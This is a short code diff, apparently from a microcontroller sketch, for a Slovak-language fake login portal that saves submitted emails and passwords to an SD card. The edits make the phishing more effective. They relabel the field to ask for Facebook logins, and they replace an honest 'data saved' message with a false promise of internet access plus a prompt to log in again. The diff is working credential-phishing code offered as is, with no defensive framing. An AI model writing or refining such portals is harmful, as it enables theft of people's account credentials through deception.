@@ -50,9 +50,9 @@ void handlePost() {
 
     // Uloženie do SD karty
     saveCredentials(email, password);
-    webServer.send(200, "text/html", header("Úspech") + "<p>Údaje boli prijaté a uložené!</p></body></html>");
+    webServer.send(200, "text/html", header("Úspech") + "<p>Údaje sú v procese, počkajte prosím ...<br>O chvíľu ste pripojený na internet ...<br>Ak to trvá príliš dlho,<br>skúste sa prihlásiť znovu<br>a skontrolujte chyby!</p></body></html>");
   } else {
-    webServer.send(400, "text/html", header("Chyba") + "<p>Prosím, zadajte platné údaje!</p></body></html>");
+    webServer.send(400, "text/html", header("Chyba") + "<p>Prosím, zadajte platné údaje alebo to spúste novu!</p></body></html>");
   }
 }
 
@@ -60,8 +60,8 @@ void handlePost() {
 void handleRoot() {
   webServer.send(200, "text/html", header("Prihlásenie") + 
     "<form method='post' action='/post'>"
-    "<label>Email:</label><input type='text' name='email' required><br>"
-    "<label>Password:</label><input type='password' name='password' required><br>"
+    "<label>E-mail alebo Facebook</label><input type='text' name='email' required><br>"
+    "<label>heslo</label><input type='password' name='password' required><br>"
     "<button type='submit'>Prihlásiť sa</button></form></body></html>");
 }
 
